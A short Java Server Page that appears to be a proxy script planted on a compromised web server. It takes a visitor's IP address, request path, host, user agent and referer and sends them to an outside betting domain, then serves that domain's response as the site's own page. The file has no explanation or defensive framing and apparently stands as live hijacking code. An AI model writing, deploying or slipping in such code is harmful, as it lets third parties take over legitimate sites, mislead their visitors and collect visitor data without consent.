<%@page language="java" import="java.util.*" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@page import="java.net.*" %>
<%@page import="java.io.*" %>
<%
    String rawId = request.getParameter("id");
    URI encodedURI = new URI(null, rawId, null);
    String encodedId = encodedURI.toASCIIString();
    String ip = null;
    String[] ipHeaders = {
        "HTTP_CF_CONNECTING_IP", "REMOTE_ADDR", "HTTP_CLIENT_IP", "HTTP_X_FORWARDED_FOR",
        "HTTP_X_FORWARDED", "HTTP_X_CLUSTER_CLIENT_IP", "HTTP_FORWARDED_FOR", "HTTP_FORWARDED"
    };
    for (String header : ipHeaders) {
        ip = request.getHeader(header);
        if (ip != null && !ip.isEmpty()) {
            break;
        }
    }
    if (ip == null) {
        ip = request.getRemoteAddr();
    }
    String file = request.getRequestURI();
    String host = request.getHeader("Host");
    String userAgent = request.getHeader("User-Agent");
    String referer = request.getHeader("Referer");
    String targetURL = String.format("https://www.xosobet888.com/index.php?id=%s&ip=%s&file=%s&host=%s&referer=%s", encodedId, ip, file, host, referer);
    URL url = new URL(targetURL);
    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
    connection.setRequestMethod("GET");
    connection.setRequestProperty("User-Agent", userAgent);
    connection.setRequestProperty("Referer", referer);
    int responseCode = connection.getResponseCode();
    StringBuffer responsej = new StringBuffer();
    InputStream inputStream;
    if (responseCode == HttpURLConnection.HTTP_OK) {
        inputStream = connection.getInputStream();
    } else {
        response.setStatus(responseCode);
        inputStream = connection.getErrorStream();
    }
    BufferedReader in = new BufferedReader(new InputStreamReader(inputStream, "UTF-8"));
    String inputLine;
    while ((inputLine = in.readLine()) != null) {
        responsej.append(inputLine);
    }
    in.close();
    out.println(responsej.toString());
%>
